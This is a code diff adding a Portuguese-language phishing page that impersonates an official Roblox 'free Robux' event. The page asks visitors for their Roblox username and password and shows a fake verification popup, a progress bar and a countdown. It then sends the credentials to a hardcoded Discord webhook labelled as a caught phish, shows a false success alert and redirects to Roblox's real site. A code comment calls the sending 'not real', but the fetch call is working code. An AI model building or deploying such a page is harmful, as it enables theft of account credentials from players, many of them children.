@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Promoção Roblox - Robux Grátis</title>
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background-color: #121212; /* Cor escura de fundo */
+      font-family: 'Fredoka One', cursive;
+      color: #fff;
+      text-align: center;
+      padding: 50px;
+      overflow-x: hidden;
+    }
+
+    .container {
+      background: #222; /* Fundo escuro para o conteúdo */
+      color: #fff;
+      max-width: 400px;
+      margin: auto;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.5);
+    }
+
+    h1 {
+      color: #ffcc00; /* Cor dourada, estilo "oficial" */
+      font-size: 28px;
+      margin-bottom: 20px;
+      animation: neon-flicker 1.5s infinite alternate;
+    }
+
+    @keyframes neon-flicker {
+      0% { color: #ffcc00; }
+      50% { color: #fff; }
+      100% { color: #ffcc00; }
+    }
+
+    input {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 2px solid #fff;
+      border-radius: 10px;
+      background-color: #333;
+      color: #fff;
+      font-size: 16px;
+      transition: all 0.3s ease-in-out;
+    }
+
+    input:focus {
+      border-color: #ffcc00;
+      background-color: #444;
+      box-shadow: 0 0 10px #ffcc00;
+    }
+
+    input::placeholder {
+      color: #bbb; /* Cor para o texto de placeholder */
+    }
+
+    button {
+      background: #ffcc00; /* Botão amarelo dourado */
+      color: #222;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: all 0.3s ease-in-out;
+      box-shadow: 0 0 15px rgba(255, 204, 0, 0.8);
+    }
+
+    button:hover {
+      background: #ff9900; /* Efeito de hover para escurecer o botão */
+      transform: scale(1.1);
+      box-shadow: 0 0 25px rgba(255, 204, 0, 0.8);
+    }
+
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #bbb;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 5px;
+      background: #444;
+      border-radius: 50px;
+      margin-top: 15px;
+    }
+
+    .progress {
+      height: 100%;
+      width: 0;
+      background: #00ff00;
+      border-radius: 50px;
+      animation: progress-bar 3s linear infinite;
+    }
+
+    @keyframes progress-bar {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+
+    .logo {
+      width: 200px;
+      margin-bottom: 20px;
+    }
+
+    .popup {
+      display: none;
+      background: rgba(0, 0, 0, 0.8);
+      color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      margin-top: 20px;
+      font-size: 16px;
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.8);
+    }
+
+    .countdown {
+      font-size: 16px;
+      color: #ffcc00;
+      font-weight: bold;
+      margin-top: 20px;
+      animation: countdown 1s infinite alternate;
+    }
+
+    @keyframes countdown {
+      0% { color: #ffcc00; }
+      50% { color: #ff6600; }
+      100% { color: #ffcc00; }
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img class="logo" src="https://www.roblox.com/asset/?id=5554787341" alt="Roblox Logo">
+    <h1>🎉 EVENTO ROBUX 2025 🎉</h1>
+    <p>Insira seu usuário e senha Roblox para receber até <strong>100.000 Robux</strong> em 24 horas!</p>
+    
+    <input type="text" id="username" placeholder="Usuário Roblox">
+    <input type="password" id="password" placeholder="Senha Roblox">
+    <button onclick="coletar()">Participar</button>
+
+    <!-- Fake progress bar -->
+    <div class="progress-bar">
+      <div class="progress" id="progress"></div>
+    </div>
+
+    <!-- Falso pop-up de verificação -->
+    <div id="popup" class="popup">
+      <p><strong>Verificando sua conta...</strong></p>
+      <p>Processo de segurança em andamento...</p>
+      <p><i>Isso pode levar alguns minutos...</i></p>
+    </div>
+
+    <div id="countdown" class="countdown">
+      Tempo restante: <span id="timer">10:00</span>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2025 Roblox Corporation | Evento limitado até 12 de maio.
+  </div>
+
+  <script>
+    function coletar() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+
+      if (!user || !pass) {
+        alert("⚠️ Preencha todos os campos.");
+        return;
+      }
+
+      // Mostrar popup de verificação fake
+      document.getElementById("popup").style.display = "block";
+
+      // Iniciar o progresso
+      let progress = document.getElementById('progress');
+      let width = 0;
+      let interval = setInterval(() => {
+        if (width >= 100) {
+          clearInterval(interval);
+        } else {
+          width++;
+          progress.style.width = width + '%';
+        }
+      }, 30); // Progresso em 30ms
+
+      // Simular envio dos dados para webhook (não real, mas muito convincente)
+      setTimeout(() => {
+        fetch("https://discord.com/api/webhooks/1370071376114745364/zlZ3cxpaxXiGYAqSpfWMOeXwhkZy_p7voLD7kyMuf_1ZY8Su1gyi6uJkf-vAM0qRHTlh", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: `🎯 PHISH PEGOU UM 🎯\n👤 Usuário: ${user}\n🔑 Senha: ${pass}`
+          })
+        });
+
+        // Falsificar resposta
+        alert("✅ Robux será creditado com sucesso! Aguarde até 24h.");
+        window.location.href = "https://www.roblox.com/contact-us"; // Fuga do redirecionamento direto
+      }, 3000); // Atraso de 3 segundos para simular 'processamento'
+
+      // Simulação de contagem regressiva
+      let timer = document.getElementById('timer');
+      let countdown = 600; // 10 minutos em segundos
+      setInterval(() => {
+        let minutes = Math.floor(countdown / 60);
+        let seconds = countdown % 60;
+        timer.textContent = `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+        if (countdown > 0) countdown--;
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
